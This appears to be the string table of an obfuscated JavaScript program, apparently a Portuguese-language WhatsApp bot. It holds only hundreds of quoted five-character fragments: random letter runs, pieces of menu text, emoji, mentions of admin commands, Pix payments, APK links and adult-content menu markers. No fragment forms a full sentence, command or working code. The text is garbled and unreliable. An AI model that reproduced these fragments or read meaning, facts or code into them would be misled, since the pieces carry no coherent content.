'|1|9|', "m nad", 'IBMGE', 'uXWKy', 'dPtyO', 'fjtVk', 'RLWUd', 'tJrqc', 'maLmK', 'xqVxk', 'mRMpK', 'dead-', 'YyKYH', "os pr", 'lxibe', 'lVHKx', 'icEzH', 'SPECI', 'ionMe', 'IAqSB', 'Menti', 'sFwKL', "DAS 5", 'dYumm', 'rumar', 'PRwnA', "ra nã", "i ati", 'erdeu', '(asyn', ": O t", 'hNDBR', 'dIeFq', "já ro", "🔞 𝐌𝐂 ", 'BhHfi', " bot:", 'itóri', "a:*\n\n", 'BHCAH', 'ccc51', '4|5', 'QWArI', '*ERRO', 'rGQEz', "ixos\n", "ara e", " máxi", "RAG R", "sta b", 'PrRpx', "e Gol", 'ydVaz', 'ITES,', 'WNdCV', 'Bckiq', 'hgRai', 'BFnRs', 'iWPxi', 'lnpod', 'buOEY', 'k/Las', 'da:', 'puJeK', "co, a", 'LsCQC', 'Dev', 'LoApY', 'MVfYi', 'ELKin', 'ojDhn', 'I37OT', 'iremo', 'ZclEP', 'yTRxn', 'zxels', 'wTazL', 'MwxhN', "ᥲ ᥆ρᥴ", "al*\n!", "a as ", " ❄️\n", 'zhKEF', 'dBqXO', 'cade?', 'Hacke', 'RDE..', "lo de", 'SRqOj', "ogo c", 'erv2', '_qoXA', 'nados', 'nQHdw', "u o a", 'zcWuT', "z. ", "es em", 'lhobi', 'IjAeK', 'Ejdyu', 'Vinga', 'fKNEQ', " ⪧ *", 'oijyd', ".._\n_", "    _", 'TpNYA', 'ytZuG', "✅ 𝐀𝐓𝐈", "o pos", "ER\nht", 'númer', 'LZVJw', 'addpa', 'com/', "nido ", 'TfCbl', 'SqtgO', 'miiQz', "❄️ 𝐑𝐈𝐂", 'zTRmR', 'ECQLi', 'VDVBr', "o val", 'jlGsR', "ilho ", 'OHOtI', 'eqxoE', 'to>', 'CXgkc', '───*「', "Pix g", 'eVyHY', "Um va", "𝐈 𝐕𝐈𝐃", 'Tytai', 'a1411', 'mDmxS', 'PhqcG', 'imedi', "a), s", 'cMqhA', "gem /", "😏 @", 'ntato', "casa ", '/Imag', 'a6ec8', 'Afljd', "ar as", 'GMKKq', 'QinLW', "Cep: ", "e: me", 'quero', 'WqkOH', 'eCObY', " favo", "PK* 📂", 'jjtzZ', 'sBcoE', 'KjCPA', 'WxnPm', "nra a", 'balme', 'ck-na', 'bddc2', "s ace", '.rar/', 'sVrdb', 'QDFbg', 'HSAdW', 'FPEmI', ",* pe", 'Vcnht', 'produ', 'TtZOm', 'mal.', 'a8736', 'exitg', 'obwIy', 'gdFEy', "𝗔𝗡 🇯🇵", 'DFRGQ', 'msoCO', 'wScnd', 'FsxiR', 'pEAkL', 'upos.', 'YLvrM', 'il/%2', 'inaMu', 'tekil', 'UgEQI', "uer c", "A tan", 'biogr', 'tvDuG', 'OMAmh', "cia p", 'gxlZK', 'pFWmE', 'TAVmY', 'NKTAD', 'etTDb', 'slOcr', 'WFqgF', 'TuNSd', "nesa ", 'fknMl', "sa ap", 'kCwFV', "A OS ", 'demon', '.5-co', 'Xjqgh', "o \n🪀 ", 'mguRr', 'FFFwk', " de r", 'dUIHK', 'tWOPf', "❄️ 𝐓𝐎𝐊", 'PZTFw', " play", " / Br", 'iSvxb', 'kvnZT', ":\nCPF", "\n\n*1 ", "_- PR", 'xHIme', "ot 10", 'IVxFX', 'novar', 'emfun', 'gqRIE', "as al", 'es..', 'NDxsJ', "3. ❄️ ", 'lasse', 'qgAPW', 'IpoVY', "Link ", 'YRkUW', 'XJNuP', 'farlL', 'GnGaf', 'kkkk', 'CGtkc', "ssim ", 'ApJpD', "ele n", " ⃝⃔🇯🇵\n", " bron", 'wnhbX', "é a l", './ESD', "ot: ", 'coOER', 'UaefC', 'EiBBe', "Pelo ", "ono a", 'dcHFn', 'NIpCB', 'oVZnW', 'zdpWK', 'xiovB', "bot ", "(0) p", 'TOKEN', "𝐀 𝐃𝐄 ", 'JyblG', 'XoQYX', 'Ugxmc', "êmio ", "NGER ", 'esban', "\nSe q", 'NyJBE', 'Srllq', 'InSec', 'esque', 'DPzIt', 'dl-ms', 'vuhZb', "𝐑𝐈𝐀 🔞", 'BkHmT', 'JToHN', 'oSoyG', 'RutRw', 'ypmHK', '8f9fe', " <Mar", 'joJLg', 'tab/a', ":\n!ca", 'TmlTM', 'chHts', "| Par", 'irrMf', " 𝐃𝐄 𝐅", 'apr', ": [ ", 'orret', "E PED", 'JePaE', 'RDdor', "\n\n★彡[", " PACK", 'yMCVq', 'toFix', 'hEPPp', 'tRkYL', "SON o", " url ", 't=%20', 'ivinh', "*• Me", 'pgNrd', 'psfAj', "ada 2", 'resti', 'beHHD', " 15 c", 'ente!', 'rdWDS', 'premi', "ui ac", 'WfxhL', 'kLAGL', "eve v", 'GZbyp', 'qafcE', 'GVtlC', 'LtEKB', "a T 🔞", 'alhem', " ao a", '1eoWL', 'UBOjA', 'trBPn', "m: ", "18. 🔞", "to de", "ite P", 'eGgZy', 'rSKmC', " o ar", "m, pa", "a na ", 'ultip', 'p.net', 'Waifu', 'index', 'simi', 'wBEJK', " é mi", 'do...', 'arLwS', 'i/CRI', 'rro..', 'BuGLG', 'ypCwt', "𝐍𝐄𝐒𝐀 ", 'jZZrM', 'clown', 'PAlHP', 'ANeHQ', 'FgmGi', "do o\n", "+18 6", 'per_l', "1 Gol", 'JOnWX', 'ZtDLh', 'SA_su', "o cad", 'iva..', 'usAC0', 'hRUeN', 'VDSql', ", \nco", 'yuaZn', 'CrsUb', 'ar_fo', 'l.com', 'igaca', "es: V", 'uefTb', "fale ", "ADE 🌹", "or de", 'Dumhw', 'sDUoj', " Spot", 'qtQBO', 'rLarg', 'ppbPf', 'jogar', 'qnxEI', 'KFcdA', 'ٜ⟅◌ٜ🛸', '17.7-', 'kcoPf', 'SbkGa', 'woFbh', 'abela', " Memb", 'ainel', "e da ", "Com O", "ento\n", 'bc51c', 'a-mos', 'BNeln', "𝑰𝑶 2 ", "𝐄 𝐑𝐎𝐂", 'bmJAL', "as nã", 'gtaDA', 'EwvMB', "So im", 'XCFoS', "𝐓𝐎 🔞", 'qzZwt', 'nota', 'tOtrT', 'tura.', 'SQxZf', 'XqWsd', " 1 ] ", 'ZCqTf', 'xOVVl', "k do ", 'edPrZ', 'zRqPj', 'UxzhL', 'off', "me va", 'gSjCR', "es es", 'AajeK', 'QzUIc', 'jHHOb', 'JrDAX', 'IdMUu', 'tesou', " reve", "13. 🔞", "lo ad", 'JfZpc', "o na ", "ITE +", 'ents/', 'YDlBh', 'KzIaW', 'up1ll', 'xGsFR', 'gtWrn', "🇯🇵 𝗦𝗛𝗜", 'FGMRK', '[a][b', 'OCsvd', 'crRQn', 'toxic', 'ões:*', "6 (KH", 'LEyei', 'DYQDm', 'VOWRE', 'GbxCU', 'ero*)', 'PsaTt', 'OcSGJ', 'kMVas', 'mbZsh', 'eKulT', 'BLuXK', 'IPhon', 'qBeyW', '❌Some', 'fAhmx', " gent", 'Uatdl', "*Ops ", 'EoAea', 'acham', 'qualq', 'trada', 'mins', 'FHEaL', 'ctsAr', 'Messa', 'fKvQK', 'VXAzY', "de* :", 'ypQiC', 'oDfDB', 'resum', 'vo!', " Rein", 'ckAOF', 'CQElE', " puxa", " III", "sua o", "𝐍𝐎𝐁𝐔 ", "É ape", "uivo ", 'KzKEE', 'ewQFy', "or um", 'edido', 'Lsixx', "bo. A", "e vin", 'Jtupl', "/ o *", 'guTCx', 'ario', " to S", 'dpmpp', "> { ", 'NjMiZ', '═▂▄▄▓', 'V2Ext', 'respo', 'rjEMJ', "a adm", 'OdpBO', 'KJukE', 'ooTBU', 'qmmyi', 'bPTwA', 'YtFNy', "vo ad", 'gxAZf', 'iuwhr', "do ti", 'EuCrj', 'Jid', 'lxuJv', 'gurin', 'tRkjf', 'VGemw', "umo g", 'EeMfQ', '-glob', 'r..', "e, so", "s 0", 'dEutE', 'TTSMg', 'úncio', "\n\n🕹️ R", 'donos', 'tagme', " ❔ Su", 'JLRbO', 'DuQnP', 'ly=Sh', 'rg_al', 'XUCKs', "ria d", 'FupJY', 'rtici', 'ufTtR', "__-_\n", 'tado', 'ljfkv', 'nuAZw', 'DZTDK', 'IGAFS', 'vRZHU', 'asile', " acei", 'RxJwj', "🌦️ Cli", 'PUdAt', 'api/d', '┄━┄━┄', 'WUksh', "io ti", "16. 🕹️", 'geJDd', "ples ", 'HpCel', 'pEYBO', 'OxhuL', " Khal", 'lrvoZ', 'OtNjn', 'HJije', 'ech:8', 'andam', 'juezz', 'nviad', 'nsCou', 'imvMI', 'vxrCx', 'CnjKg', "STE P", 'ZDpJa', " extr", 'CTnUE', "er O ", 'wAxKi', 'ObCjP', "a @", '2|3|0', "🇯🇵 𝗜𝗧𝗢", 'Fuaes', 'TAceH', 'xmAzR', 'Ppwjy', 'MOcZp', "que u", 'Mgkke', 'IdDDR', 'mZpVq', 'WCmDs', " func", "/3, t", 'UJXbk', "de ", " - 🎥 ", 'ikey', 'qhiLk', 'QUKkk', 'krwjd', 'art', "] com", 'eQzWD', "ara d", 'NQfPT', " a es", ": 0\n⋆⃟", " adm ", " aind", 'LeBJK', 'PAPIS', 'erQSm', 'YMclk', "a rem", 'uMqqB', "🤨 Sus", 'ifzCD', 'EWeor', 'AVmyI', "ta el", 'CpeIn', "64. ❄️", '.18.1', 'yLPgF', 'WtFID', 'gkYcr', 'guel2', 'ridad', 'gmpfd', "os da", 'hnxea', "❄️ 𝐀𝐌𝐀", 'vUdxM', " ou c", 'rKFIe', "m iss", 'nFdDB', '_pref', 'WnkMd', 'Izvfc', '𝐌𝐀𝐃𝐀𝐒', 'rRVUM', 'rsati', 'zbXue', 'hzToX', 'lecio', 'w.git', 'kDBbZ', 'qwvxP', '/usua', 'VDBcv', 'sumin', "ra ti", 'jVCws', "ི⋮ ྀ🌴", "tos: ", ": \nht", 'xwrIf', 'NcWhs', 'Qbvdw', 'essas', "a\nusu", 'ueado', 'UZcic', 'strea', " dar ", 'YGPDf', 'EjuVO', 'HARM_', 'corre', "no gr", 'cEaCh', 'ninha', 'eact', 'nnoun', 'pfaqT', 'pasta', 'Uitmb', "A rai", "ir, f", '|5|0|', 'jEBhl', 'QTIsz', 'key', "\nExem", 'qsCIy', './img', " o qu", 'JMvNX', 'IcEwN', 'lista', " bloc", 'csokI', 'empat', 'TMhTq', 'divin', 'Neowa', 'trike', 'EaBun', 'icqmk', " e pr", 'VXpKe', '𝐍𝐂𝐈𝐏𝐀', " Ms", 'kcvTG', 'WXqnv', 'tegor', "║✼ De", " dest", 'wFtlL', 'DNMQq', 'cos', 'tomat', 'OXJtb', 'TPgEv', 'preci', 'omeDo', 'sTbqn', "mato ", 'glx', "OF ST", 'Wtkkf', 'razer', " 🖥\n7 ", " quin", 'cita2', "Não h", 'n/js', 'qrYYt', 'wKRfM', 'lrgkR', 'GIBRH', 'Pzaie', "cmd  ", 'on/mu', 'membe', 'tnrqU', "mem. ", 'SfNyY', 'BulKo', 'HmIXv', 'nerar', 'xZEtd', 'SGONs', '/ass/', 'HBqbx', 'PWwqE', " @mar", 'lFesO', "novo ", " Do g", " NO G", "1 mem", 'irzej', " Z - ", "as no", 'ZNChf', 't=jso', 'NBfcP', 'on/le', "á 5/5", " tind", 'VDKCf', 'LeYCT', 'RDIcy', "5 usu", 'NXhHX', 'EgtVu', '𝐄𝐧𝐭𝐫𝐞', "da, d", 'UUWro', 'owFQQ', 'atlet', "ne: ", 'b6bce', '136', 'ly=So', "+ Mod", " [ AD", 'lkOOF', 'RmnWj', 'tagen', 'domés', 'RthTb', 'c14ca', "um er", 'iJVjE', "e áud", "ado\n-", 'pgcEZ', 'Tzqdt', 'tQccX', 'BeymY', 'acess', 'zgJRo', 'nlzts', 'yKvNI', 'Lfxwg', "ocê r", 'yzANC', 'QrWza', 'phine', 'C7Kru', "ara t", "sApp ", 'onou!', 'entac', 'HbMhy', "e_ts ", 'XmOQh', 'wjoqh', 'EpqeX', '*LIST', 'SWsiu', 'kPFAl', 'XfgdM', 'tarei', 'wYWnL', 'yzNbE', "AIS U", 'RLTXR', " serv", 'rSUFC', 'ZjoAV', ", e m", 'cAkVK', 'TXXDJ', 'cles/', 'tcnhE', 'Ktipg', 'adqui', 'modob', 'bMpnB', "to gr", "São P", " copi", 'AlJJe', " jogo", "\n║ 💾 ", "io nu", '𝐏𝐑𝐈𝐄𝐓', 'lhOAq', 'wpyhw', ", e d", "%*\n🍼 ", 'BZALT', 'RQVNo', 'thrSM', 'chbbv', 'BIKIN', 'sdRvg', 'IDLGt', 'Rrjwa', 'NqwmL', "u mar", 'sAIon', 'bwIAl', 'cyTca', 'X_v2.', 'EMUpw', 'AOPEI', 'yNbhN', 'OAgEh', 'wind', 'niWwT', 'amily', 'qEuMa', 'vyydt', 'bot🚫', 'TaTUg', 'qcwKv', 'eYrUY', 'fJjdZ', "\n⬇️⬇️⬇️\n", '0?cb=', 'QhIqv', 'OD-t.', 'RHZJd', 'mime', "ixo\n\n", 'RljNm', 'forme', 'Dumjp', 'RSpKQ', 'MNVEV', 'COMAN', "no do", 'fxSUY', 'setem', 'hiryu', "nao t", "rar a", " 🖥", 'ar_vo', "26. 🔞", 'buffe', 'raGom', 'ciKza', 'Fzljo', 'eUsKI', "de ac", 'DfqDb', 'antic', '14e4a', 'WkkkC', "/ *ta", 'fsnyB', 'jQnRJ', 'qsCzE', " de v", " \n\nCo", '7yjbb', "ero :", 'angel', "rte, ", "sar a", "erá n", 'tHIkp', 'ont.f', "ser a", 'VDlYS', " de x", '🟦🟦🟦🟦🟦', " SÓ P", 'zYAHb', "8. 📍 ", 'ceu', 'fdtbp', 'dGvTu', 'bf1b2', "ta ao", "a a d", "00\" ", "a pas", 'gif/t', 'regis', "de al", 'IbMlO', 'cmCSA', 'xmKmY', 'oTsxv', "itos ", "ntas ", "ma op", 'lds.', 'ancar', 'EahDk', 'YQFFI', 'gIakQ', 'oXdVI', 'zztPo', 'KkGMG', ", cad", 'eb6e4', 'ify?u', 'cAABE', "ance ", 'FYUmg', 'bEMjD', 'ascot', 'BpRiB', 'on/al', 'LvXbx', "SE PA", 'vMvjq', 'vrHoE', "u don", 'DFSGQ', ". Aqu", 'xXyJv', 'miku', 'lBIgK', "p 2 (", 'fqoDi', "to lo", 'rma..', 'p.jso', 'quest', "𝐈𝐎 ❌", 'os...', 'CGPoS', 'NYgqY', 'RQGhm', 'NmKfH', 'QhEXZ', 'PHNLn', 'de-sc', 'Statu', 'YNBTf', "vo. O", 'YaTvz', 'iogol', "IF do", 'rm-ms', "[ EXP", 'AlcDN', 'ateBu', 'hSLqd', 'RStvC', 'lyqHf', 'pULQm', "Cleo ", "𝐎𝐏𝐀 ❄️", 'pages', " PERG", 'vdtQd', 'pNkIa', 'uBqEQ', 'MEeCm', 'wvepn', " easy", 'krVOh', 'JOTgZ', 'Deaxl', 'NwvDR', 'UddJf', 'BSgYb', 'earch', 'JMucp', 'gpKPZ', 'OfcUF', 'VjexV', 'iyqYx', "m voc", 'rjqn5', 'ada', 'Knglh', "e del", 'ieIwL', 'rvJjs', 'items', 'YRJQg', 'e/552', 'rhqoW', "ite e", '&inpr', 'aGcEn', 'IwGpO', 'fzXhl', ", nem", " DE C", 'Efwok', 'YBXpN', " usar", "ado:\n", " 𝐍𝐀𝐓𝐇", "á te ", 'OqjSR', "ê pre", 'WMSex', 'BpaVF', 'o&exp', "uso a", 'XFZbB', 'EVuSh', '25c7c', 'RLvyI', 'oGCQK', 'rutos', "𝐍𝐆 ❌", 'dada.', "r exe", 'kCQXh', 'zBgjZ', "𝗧𝗜𝗔 🇯🇵", 'PvdYv', 'LBfMa', 'respt', '=-2%2', 'bio', 'HIWmK', 'BNBOY', 'ortre', 'GsQqp', 'ssand', 'sivel', "2 ] ", 'JCukF', 'fPDbf', 'dxuip', 'ERBPx', 'rUTKo', 'oXvwy', "\n\nLog", 'video', 'TOgII', 'zQrHh', "isar ", "lvo q", 'HThEw', "nica ", 'FwtkW', 'JOwcr', "a... ", 'menu3', 'nzztv', 's/Egr', 'gIaXg', 'gras:', 'cias.', '1.tex', ":*\n\n*", 'qtKJH', 'qrjah', 'dMPTR', 'pKxsS', "𝐑𝐎𝐒𝐀 ", 'AFIPY', 'kNLPI', 'swIJh', 'wTSCs', "apa, ", 'xOBXZ', " titu", 'CPxrM', 'fRzLA', 'fVxsC', '0.8,e', "Pix c", 'lWoUi', 'ebZCQ', 'CWLNB', "Dos G", 'FctKy', 'VoWxk', 'Quant', 'zEWxo', 'nTVeo', '𝐃𝐌𝐈𝐍𝐒', 'MDjZf', "OKA2 ", 'dores', 'aAaqM', "] Mas", "al Ri", 'uaJld', "ig18 ", "\n> Gr", 'DnAWx', 'pGPZG', 'mCGqD', '3O_PT', "i fal", 'kSBTg', " RHYA", 'rHPbe', "2 sin", 'cwDLp', 'canEr', 'dsXQU', 'Xjeyt', 'QYwUh', "a : @", 'Edhnx', 'DOKKA', 'dGckM', "l ler", "bos s", " AMAN", 'Bdzqc', 'cHYvb', 'goria', 'nxXBe', "re ne", 'Kcdtc', "e blo", 'oPRuq', "nto I", 'sKzdO', '1|5|3', "o tít", 'liqQK', "O tex", 'lJsIT', 'faGxf', 'PIPaY', " corr", 'zxfWY', 'rjSXc', 'sTbbA', "R 3 V", 'scPWR', "ta 0", " +\nEx", "ido o", 'e844b', "0\n\nAu", 'kzeJR', 'CQOLA', 'ObWfa', "v 1", '|0|2', 'eBVvF', "───\n\n", "nse m", "*\n🪀 *", 'ATATW', 'cKqKF', " nada", 'vezes', "* wa.", "UER\n\n", 'sitiv', "*\n│\n│", 'kzzvn', 'nShxw', 'gSBlR', 'wrBkM', 'forwh', "ogo, ", 'eel+W', 'asa', 'oIzAY', 'qolEE', 'MRtur', 'FfFDq', 'ero', "🔞 𝐍𝐄𝐓", 'ncHGH', 'pFQtm', 'UpPFv', 'ebida', 'eHMNX', " quan", 'prime', 'ogos', 'hvWRY', 'tIPzM', "𝐓𝐄 𝐂𝐎", 'FjUFQ', "o des", 'lJaUf', "a url", 'eUaWp', "ts mi", 'dxpku', "𝐬𝐢𝐜𝐚 ", '.apk/', 'kes', 'hqDJs', 'fq/dr', 'gJejv', 'DuFPC', 'RizQh', "ou e ", " 📊\nPo", "& APK", 'BDMDk', 'AyIbv', 'ɴᴛᴇ-s', 'TsXkH', " o st", "ões:\n", "2 tan", '07e79', 'SjOme', "\n*FEC", 'fMBgi', 'IVInh', "____\n", " \n/ o", "𝐧𝐝𝐨𝐬\n", "o:*\n\n", 'hh:mm', 'SMVxL', " NEZU", "🚨🚨\n\n█", 'opaci', 'aPeSU', 'cWAeF', 'fYJow', 'ttITo', "ite p", 'n/vid', 'ids=', 'ZwBYL', "ᴀ👩🏼\n  ", 'YmUuE', 'XNHRl', 'mVJVG', " 𝑨𝑼𝑫𝑰", "ae lo", 'AdTyO', "m abr", 'sidts', "\n偷⾛了我", 'DYGCz', 'culad', "ara m", " apos", 'XrVoW', "ande ", '0a43a', "foi A", 'ltmtS', 'cJhiH', 't=800', 'sed?a', 'WLncC', 'ersas', 'LdHVM', 'JHSZU', 'narut', " marc", 'BXCXC', 'pensa', "ores ", 'ZRaaL', 'anscr', 'ex-al', 'DzABJ', "RDAR ", "uso d", 'qgrEf', "inks ", "ivar ", 'ATOtS', " 𝐃𝐈𝐆𝐈", 'iciou', "o 🥺", ", *ho", 'FmaPS', 'zeGXx', ") -", 'xFzFo', 'sazFW', 'PRECI', 'okyo?', "1 - @", 'ulOnY', 'cado.', 'dIwog', 'HkVkF', 'iHupa', 'oLkPN', 'DLXBF', 'JgATV', "á jog", 'yCdVT', "⚠️- OB", 'gfByV', "tro d", 'nhInM', 'EGORI', " 😐\n", 'XPXDY', 'EHTZH', 'WTOpf', 'XntZG', 'ELRUj', 'DpUnG', 'hYzMN', 'quiz', " \n\n[🎴", 'SCKpk', 'yGAqi', 's-aut', 'oxmIV', 'adrin', 's/Bel', "\n║ 💨 ", 'gcGPK', 'Desat', 'tionM', 'ct.js', 'ão*', 'ssoa,', "s.\nEx", "￣￣￣￣\n", 'qqdUu', 'QZJSy', 'rPZEp', 'WCpQn', 'pPLEY', 'SsEzl', 'feqyK', 'DSRoH', 'fVdrj', 'LCGKh', "nkgp ", 'hsMvO', 'IyQJU', 'bJShI', "ída2 ", " part", 'qcoKL', 'jVtWr', 'cXXzs', 'brand', "pt, v", "𝐍𝐃𝐎𝐒 ", "𝗔𝗦𝗔 🇯🇵", 'xvUOA', "🇯🇵 𝗬𝗨𝗞", "\nPerd", "l For", "is ve", 'letou', "so:*\n", "lhi* ", 'EGbxo', 'addpr', "0\n\n2 ", 'eset', 'oWPpe', 'velin', 'xBrbb', 'tuVMx', 'FXjyv', 'LbmsL', "\n15. ", "IR E ", 'MENT', 'iste2', 'wfyPu', 'awgyH', 'RgHcr', 'dono4', 'pbv8d', 'JfJLX', 'fbbBn', 'yNubR', 'ançag', 'hcvEr', 'oKCrY', "IOS P", 'sbPWG', 'LAKtB', 'tWvRH', 'EWePa', 'ento:', 'cance', 'to.*_', 'XvFUy', 'HblzU', 'ZLoEx', "by Ak", "🎯 Ati", " 𝐀𝐌𝐀𝐃", 'nitsu', 'ksWxx', 'nYcIn', 'terva', 'hoqtq', 'FAaYN', 'avrag', "ere r", "-/ +/", "ule.\n", 'fbUpX', 'agame', 'ONkMZ', 'ADD_C', 'vgWcQ', 'azio.', 'BXhwY', 'Foaxf', 'RVujW', 'AaMfl', 'bitád', 'limpa', "no má", 'HSjfC', "rro a", 'penai', 'PxHmi', 'TNLKR', 'oHDJY', 'XfOky', "\nOlá,", 'smOJU', "\n\nPró", 'ERMIN', 'ra-nu', 'KdezR', "❄️ 𝐊𝐈𝐂", 'agens', "o áud", 'nca', 'NrJNn', 'ances', " cida", "mas s", "uma g", "✓ ON ", 'ptkPq', "á Des", "o. Pa", 'ufYwZ', 'SNYNZ', 'SkkWb', 'UdVPd', 'ckLOt', 'ook', "nte f", 'NhIXq', 'AsjZw', "\n\nAnt", 'fqlkr', 'Hgcrv', 'NJOoE', 'dEHWj', 'every', "\n╔┉┉┉", '_MOD_', 'yAxqM', 'HjdpM', 'oHlEW', "u nem", 'lzSWs', 'UoLWT', '-24h', 'MkuyE', "ual o", 'qztuz', "ac 1 ", 'qIHPH', "erto ", 'pasoE', 'orce_', 'WTXoJ', "𝗨𝗞𝗢 🇯🇵", 'cKqfB', 's/net', '𝗟𝗣𝗔𝗣𝗘', "UEL U", 'CjIeq', "s 📝", 'Major', 'nwnwL', " recr", "e ANT", '2|5', "]; [a", "sua f", 'YyDzZ', "o, só", 'zBpUr', '://ne', 'kKPCj', 'agem.', 'DDcYC', 'OS/js', "eve t", "rio @", 'VAcDn', "e*\n!c", 'GrpWV', "u num", 'hdhSS', "mbro ", " moed", "uém t", 'fari/', '-vf', 'CjukD', 'wLTJd', "raiz ", 'HBCBH', 'lklxL', "𝐀𝐒𝟐 ❄️", 'param', ", e v", 'teamN', 'nMBvq', "𝗙𝗨2 🇯🇵", 'nyQok', "OSAS ", " exem", 'vhZow', "pe, t", 'XGuJS', 'ados', " Dia", '42669', "a ros", '═༺◈✼', " a aç", 'uYCQm', 'ZMeUd', 'ZRJAg', 'FcubA', " meno", 'lCoPN', 'rBCba', "de 25", "pôs e", 'vWkGC', 'QsjQI', 'kNWrQ', 'ZbMIv', 'KtKxq', ", o a", 'qVolA', 'SALDO', 'rlFoy', 'CisxA', " SEU ", '𝐈𝐙𝐀𝐐𝐔', "seu B", 'pfdLl', "oi ad", " 📍 TX", 'IGUIn', 'bcOVZ', 'Locat', 'e4e2c', 'nsfw', '75.6_', 'chqf5', 'pk/fi', "❬ X ❭", 'MdiHh', " 𝐂𝐀𝐑𝐍", 'aqui,', 'syrWv', 'Bsubl', "do à ", 'quart', 'ttp:/', "mins ", 'egkZd', 'NYGzQ', "eus G", 'RVumk', 'eWBTa', 'AYAKA', "Há al", 'KcsFh', 'IxRnZ', '_v6.1', 'ChWaf', 'dados', 'CeOCv', 'XrJfD', 'aybac', 'iETyk', "s, ag", 'YGZEn', 'iKqla', "am At", '8d654', ". 🥲", 'culos', 'GgUuN', 'KRzFk', '😀👍', ':05', "ma de", 'ssRTY', 'pedmc', "o ind", 'SwdLa', " Não*", 'GDzVU', 'Estou', 'XMCki', 'lugsX', 'nhas', "ão Fo", "ó fun", " os r", 'SGsuz', '5fa39', 'newgp', 'SjEWs', "S 🪙💰\n", "irá a", '༺◈✼', "\n• Li", 'hcIUd', 'ybLWE', "re de", 'FaCtX', 'e6fe1', 'BLOQU', "m ae.", "║✼ Ca", 'WuNWG', 'WIkxd', 'AuEIL', 'ANSO!', "por o", 'ICnbQ', "O:\n\n", 'AAO-7', " a so", 'ucONA', 'ncont', 'beijo', 'IqoXy', '65911', 'sgold', 'jZCsZ', 'wRdIJ', "o tin", 'andan', "‼️ -> ", 'TNsdl', 'Koidc', 'versa', 'CzOxH', '_tran', 'COMUN', 'Zhyzy', 'kwkRP', 'nGLJP', 'emRVb', 'g_car', "o aza", 'vZOyG', "TAKU ", '://bo', 'ErHGC', "me id", "- O Á", 'GBwXc', 'uso*', 'onect', 'yKzpP', 'oocIY', 'BsADU', "s: Ve", 'fMxTG', 'OEbrJ', 'lavra', " due ", 'rGJFK', 'YvRtd', "R GP ", 'dtVSC', "leta ", 'girok', 'ee57c', 'VdmfY', '-____', 'OpsHi', 'EFvDu', 'Uvjbi', 'HUTKA', 'edite', "ds, v", 'wAjFN', " ao e", "da ta", 'lKIuX', 'nIklA', 'dutsX', '7a167', 'oAjcv', 'NÚMER', " AKI ", "tem G", 'EKtfR', 'x9vis', 'XZGgS', 'ZqDkg', 'srHur', " digi", 'xMIIF', "o, se", 'Ausen', 'uZeMM', " caiu", 'DtQwC', " \n\nPa", 'aço.', 'RRnDw', 'utZkT', 'refix', "𝐈𝐎𝐊𝐀 ", "🇯🇵 𝗞𝗨𝗥", "ra ba", 'RTURA', 'BVWyH', 'CZRzA', 'GsPkw', "u ser", 'xjaMy', 'ie.', "o: +5", 'rEKRM', 'USUÁR', 'BxoRW', 'riu.', 'jnjmW', 'yuw9n', 'xObym', "𝙾𝐒 💥", " em s", 'DuGsj', 'ABVyh', 'Ejyuk', 'pmDUS', '11-11', '.0.co', 'curti', "R BRO", 'fsnfv', 'nomed', 'iScKC', "61. ❄️", 'BrCZV', " IV", 'talic', 'uZuRl', 'alizo', 'toilL', 'DKueF', "15 -l", 'kTokU', 'FlZwf', 'GHQuN', 'ukxsg', 'ssJAt', "ao tr", 'b5tpr', '.blur', 'ogand', "g* *d", 'zyLjG', 'própr', 'rbkWV', 'mRmwX', 'xXWuS', 'eralE', 'uXtkQ', 'ys/lo', 'mAwMC', "g por", "\n│➽ A", 'ZQMPE', 'afCac', " os d", 'eVJUC', 'wwMLd', 'KNnZC', 'vavfp', '5163d', 'ncdES', "r até", 'UuLSd', 'icipa', 'CyYmS', 'lSllT', 'TVyEz', 'zYVtv', " Você", 'eUrl', 'VZqty', 'cdwLX', 'ELmnX', 'JTUYy', "𝐊 𝐆𝐏 ", "e cha", 'RrNMu', "o, a ", " X9 A", '𝐀𝐌𝐀𝐑𝐄', "lpe m", 'LIfnI', "] @", 'BDRnX', 'SvInd', 'WjHJH', 'gAsVU', 'HaNpW', 'fwpaz', ", o ", 'isto.', 'split', 'IXEKA', "ndo o", "na fi", 'X-WA-', 'bfCEP', "er áu", "em to", 'nesfr', "r os ", "no bo", " o li", " se a", '*falh', "da: ", 'idara', 'wDXhV', 'lucra', "or se", 'pinte', 'jogo3', 'istan', 'OBLOX', 'RDsdW', 'Earth', "r. )", 'media', ". Fal", 'eUofr', "as vi", " Giov", 'ncoes', "ogo é", 'gofIw', 'rado', 'MGZJu', 'YPZfM', 'LeueR', " avis", 'Tngvz', 'zhUtS', 'OlLPT', "um nu", 'QZSQs', "cê co", "𝐂𝐈𝐀 𝐑", " II", 'jbYKc', 'QuLJp', "o nat", "- 7 D", 'YldKT', 'ayZFj', 'il.co', 'uULGc', 'mMWii', 'bstit', 'uDzrD', 'MqNbW', 'HuiGr', '&apik', 'ZjcAP', 'avDsL', 'sntsE', 'iblic', "*  ", 'mZSBR', 'RqgBU', "DAS2 ", "2\" ", " - At", 'offer', 'isArr', 'tBHQB', 'w.goo', 'kBdWE', 'aQMhs', 'aHLmH', 'aFhhS', 'fiado', " Grou", "🎥 𝟯𝟲𝟬", 'LEWdU', "l pos", 'JaGtU', 'xabla', "ake: ", " bast", "ê ven", 'lrFCU', '____-', "ro já", "tudo ", 'proxy', 'QyRNI', 'IGHT', 'menu1', 'n&act', "rgtm ", 'dmins', 'hTwDk', 'YouTu', 'bqoCL', '----+', 'XgFPD', "d 10\n", "A com", "s e e", 'JTonH', 'KsMfY', 'ualiz', "\n✧ Pa", 'oUxSz', 'YEGmN', 'tir2', 'uRYwQ', 'qamZH', 'tNJtP', 'ormaç', 'eQmmY', "🇯🇵 𝗦𝗔𝗞", 'bc0a1', "𝐎𝐃𝐎 𝐗", 'tgNsR', 'xofBo', 'qOSNB', 'ovWES', " a bi", " LIGA", 'QpueQ', "m\nExe", 'OLoWI', 'ensio', "lo fo", "sg de", "so pe", 'vuYCr', 'cFtnS', "m Lea", 've?ur', 'SHHPC', "do se", 'lbRHB', 'teste', "uir o", 'EJBXl', 'miich', "18 at", "GR∆S ", "51. ❄️", 'altLD', "na ", 'sica', "crie ", 'sPtac', 'ogar.', 'DQrIQ', 'avra:', "10. ❄️", 'lHFYy', 'arem,', 'oIYlH', 'CpowI', " Pack", 'Myztf', 'CCNJh', 'rssRS', 'erCas', "15. 🕹️", 'text=', 'jyThj', "p. mi", "nir o", 'd-lea', ", eu ", 